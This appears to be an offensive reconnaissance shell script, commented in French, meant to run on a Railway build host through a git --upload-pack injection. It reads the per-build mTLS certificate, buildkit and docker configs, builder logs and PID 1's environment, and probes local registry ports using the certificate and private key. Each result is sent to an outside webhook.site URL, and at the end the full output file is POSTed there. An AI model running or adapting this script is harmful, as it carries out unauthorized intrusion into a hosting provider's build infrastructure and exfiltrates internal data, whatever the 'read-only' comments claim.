#!/bin/sh
# recon_cert_scope.sh — tourne sur le build host Railway via --upload-pack
# Objectif : comprendre le scope du cert mTLS per-build
# Read-only, aucune ecriture vers un service interne, aucun contenu tiers lu
# Canari : remplacer CANARY_URL avant deploiement

CANARY_URL="https://webhook.site/c5219d8b-809f-4a9f-83b4-e73e7492ab7a"
CERT_DIR="/var/lib/railwayapp/mtls"
OUT="/tmp/recon_out.txt"

log() { echo "[RECON] $*" >> "$OUT" 2>&1; }
send() {
  # envoie une ligne au canari (GET avec le contenu en query)
  curl -sf -o /dev/null --max-time 5 "$CANARY_URL/log?$(echo "$1" | head -c 800 | tr ' \n\t' '___')" 2>/dev/null || true
}

log "=== START $(date -u) ==="
log "hostname=$(hostname) whoami=$(whoami) pid=$$"

# --- 1. CERT METADATA (public, pas la cle) ---
if [ -f "$CERT_DIR/tls.crt" ]; then
  CERT_META=$(openssl x509 -in "$CERT_DIR/tls.crt" -noout -subject -issuer -dates -ext subjectAltName,keyUsage,extendedKeyUsage 2>&1)
  log "CERT_META: $CERT_META"
  send "CERT_OK subject=$(openssl x509 -in $CERT_DIR/tls.crt -noout -subject 2>&1)"

  # Serial (identifiant unique, pas un secret)
  SERIAL=$(openssl x509 -in "$CERT_DIR/tls.crt" -noout -serial 2>&1)
  log "SERIAL: $SERIAL"

  # SAN — c'est la ou se joue le scope
  SAN=$(openssl x509 -in "$CERT_DIR/tls.crt" -noout -ext subjectAltName 2>&1)
  log "SAN: $SAN"
  send "SAN=$SAN"

  # Extended Key Usage — clientAuth only? ou serverAuth aussi?
  EKU=$(openssl x509 -in "$CERT_DIR/tls.crt" -noout -ext extendedKeyUsage 2>&1)
  log "EKU: $EKU"
  send "EKU=$EKU"

  # CA cert chain
  if [ -f "$CERT_DIR/ca.crt" ]; then
    CA_SUBJ=$(openssl x509 -in "$CERT_DIR/ca.crt" -noout -subject -issuer 2>&1)
    log "CA: $CA_SUBJ"
    send "CA=$CA_SUBJ"
  fi
else
  log "NO_CERT at $CERT_DIR"
  send "NO_CERT"
fi

# --- 2. REGISTRY ENDPOINT (ou le builder pousse l'image) ---
# buildkit config
for f in /etc/buildkit/buildkitd.toml /etc/buildkitd.toml /run/buildkit/buildkitd.toml; do
  if [ -f "$f" ]; then
    log "BUILDKIT_CONF $f: $(cat $f)"
    send "BKCONF=$f"
  fi
done

# builder.log — chercher registry/push/image refs
if [ -f /var/log/builder.log ]; then
  REGISTRY_LINES=$(grep -i 'registry\|push\|image.*ref\|repository\|exporting.*to' /var/log/builder.log 2>/dev/null | head -20)
  log "BUILDER_LOG_REGISTRY: $REGISTRY_LINES"
  # envoyer les 3 premieres lignes pertinentes
  echo "$REGISTRY_LINES" | head -3 | while read -r line; do
    send "BLOG=$(echo "$line" | head -c 200)"
  done
fi

# chercher dans les process aussi
PUSH_PROCS=$(ps aux 2>/dev/null | grep -i 'push\|registry\|image' | grep -v grep | head -5)
log "PUSH_PROCS: $PUSH_PROCS"

# env du builder (filtrer secrets, garder que les noms de variable et URLs)
BUILDER_ENV=$(strings /proc/1/environ 2>/dev/null | grep -iE 'REGISTRY|REPO|IMAGE|PUSH|DOCKER' | head -10)
log "BUILDER_ENV: $BUILDER_ENV"
send "BENV=$(echo "$BUILDER_ENV" | head -c 300)"

# --- 3. RESEAU LOCAL — quels services repondent (oracle seulement) ---
# On teste les ports connus pour leurs codes retour, pas leur contenu
for PORT in 9433 5000 443 8080 2376; do
  CODE=$(curl -sf -o /dev/null -w '%{http_code}' --max-time 3 "https://127.0.0.1:$PORT/v2/" --cacert "$CERT_DIR/ca.crt" --cert "$CERT_DIR/tls.crt" --key "$CERT_DIR/tls.key" 2>/dev/null || echo "FAIL")
  log "PORT_$PORT /v2/: $CODE"
  send "PORT${PORT}=$CODE"
done

# meme chose en HTTP clair
for PORT in 9433 5000 80 8080; do
  CODE=$(curl -sf -o /dev/null -w '%{http_code}' --max-time 3 "http://127.0.0.1:$PORT/v2/" 2>/dev/null || echo "FAIL")
  log "PORT_HTTP_$PORT /v2/: $CODE"
  send "PHTTP${PORT}=$CODE"
done

# --- 4. BUILDKIT SOCKET — lister les refs d'image (read-only) ---
# buildctl depuis le host peut montrer les refs de push
if command -v buildctl >/dev/null 2>&1; then
  REFS=$(buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>&1 | head -20)
  log "BUILDCTL_WORKERS: $REFS"
  send "BCTL=$(echo "$REFS" | head -c 300)"
fi

# --- 5. DOCKER / CONTAINER CONFIG ---
# Si docker est dispo, lister les repos configures
if command -v docker >/dev/null 2>&1; then
  DINFO=$(docker info 2>&1 | grep -i 'registry\|server\|insecure' | head -5)
  log "DOCKER_INFO: $DINFO"
  send "DINFO=$(echo "$DINFO" | head -c 200)"
fi

# config files qui peuvent contenir le registry
for f in /root/.docker/config.json /etc/docker/daemon.json /kaniko/.docker/config.json; do
  if [ -f "$f" ]; then
    # tronquer les auths a 8 chars pour pas exfiltrer des tokens
    CONTENT=$(cat "$f" | sed 's/"auth":"[^"]*"/"auth":"[REDACTED]"/g' | head -c 500)
    log "DOCKER_CONF $f: $CONTENT"
    send "DCONF=$f"
  fi
done

log "=== END $(date -u) ==="

# envoyer le fichier complet au canari
send "DONE"
curl -sf -X POST --max-time 10 "$CANARY_URL/full_recon" -d @"$OUT" 2>/dev/null || true

cat "$OUT"
